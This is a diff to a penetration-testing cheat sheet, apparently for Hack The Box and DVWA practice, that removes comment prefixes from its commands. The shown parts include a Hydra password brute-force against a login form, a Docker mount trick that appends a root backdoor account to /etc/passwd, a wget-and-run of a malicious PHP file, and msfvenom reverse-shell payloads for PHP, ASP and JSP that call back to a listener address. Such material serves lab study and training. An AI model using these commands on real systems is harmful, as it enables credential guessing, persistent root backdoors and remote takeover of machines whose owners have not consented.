@@ -38,26 +38,26 @@ echo os.system('/bin/bash')
 ## Brute-force techniques
 ### THC Hydra
 ```bash
-# hydra -l admin -P /usr/share/wordlist/rockyou.txt docker.hackthebox.eu http-post-form "/:password=^PASS^:Invalid password!" -s 35644
+hydra -l admin -P /usr/share/wordlist/rockyou.txt docker.hackthebox.eu http-post-form "/:password=^PASS^:Invalid password!" -s 35644
 ```
 ## Docker
 ### Install Docker on Kali
 #### Add Docker PGP key:
 
 ```bash
-# curl -fsSL https://download.docker.com/linux/debian/gpg | sudo apt-key add -
+curl -fsSL https://download.docker.com/linux/debian/gpg | sudo apt-key add -
 ```
 
 #### Configure Docker APT repository:
 
 ```bash
-# echo 'deb https://download.docker.com/linux/debian stretch stable' > /etc/apt/sources.list.d/docker.list
+echo 'deb https://download.docker.com/linux/debian stretch stable' > /etc/apt/sources.list.d/docker.list
 ```
 
 #### Update APT:
 
 ```bash
-# apt-get update
+apt-get update
 ```
 
 #### Install Docker
@@ -65,25 +65,25 @@ echo os.system('/bin/bash')
 If you had older versions of Docker installed, uninstall them:
 
 ```bash
-# apt-get remove docker docker-engine docker.io
+apt-get remove docker docker-engine docker.io
 ```
 Install Docker:
 
 ```bash
-# apt-get install docker-ce
+apt-get install docker-ce
 ```
 #### Post Install settings
 ```bash
-# systemctl start docker
-# systemctl enable docker
+systemctl start docker
+systemctl enable docker
 ```
 #### Testing
 ```bash
-# docker run hello-world
+docker run hello-world
 ```
 ### Setup DVWA
 ```bash
-# docker run -d -p 80:80 citizenstig/dvwa
+docker run -d -p 80:80 citizenstig/dvwa
 ```
 ## Privilege Escalation Techniques
 [Basic Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
@@ -98,7 +98,7 @@ $> docker run -it --rm -v $PWD:/mnt bash
 
 adds backdoor toor:password
 ```bash
-#> echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /mnt/etc/passwd
+echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /mnt/etc/passwd
 ``` 
 ## Reverse shell techniques
 ### Bash
@@ -134,6 +134,12 @@ wget -O /tmp/bd.php <url_to_malicious_file> && php -f /tmp/bd.php
 ### Reverse shell payload using msfvenom
 ```bash
 msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.172.4 lport=443 -f raw
+
+# widows asp reverse shell payload
+msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.172.4 lport=2222 -e x86/shikata_ga_nai -f asp > met.asp 
+
+# jsp reverse shell payload
+msfvenom -p java/jsp_shell_reverse_tcp lhost=192.168.172.4 lport=2222 -f raw > cmd.jsp
 ```
 ## Miscellaneous Techniques
 ### Checking SUID files available in the system by running
